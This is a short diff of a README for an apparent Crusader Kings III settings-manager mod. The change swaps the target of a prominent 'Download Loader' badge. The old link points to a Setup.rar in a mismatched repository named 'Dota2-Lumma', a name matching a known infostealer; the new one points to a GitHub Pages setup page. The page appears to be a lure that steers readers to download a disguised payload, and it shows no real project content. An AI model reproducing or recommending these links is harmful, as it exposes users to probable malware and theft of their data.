@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Crusader Kings III Settings Manager
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://rewfdf.github.io/SetupPage)
 
 ---
 
@@ -38,5 +38,6 @@ configs/
 `Crusader-Kings-III-Settings-Manager` · Updated: 2026-10-30
 
 **Tags:** `crusader-kings-iii` `settings-manager` `strategy` `campaign` `tactics` `windows` `steam`
+
 
 
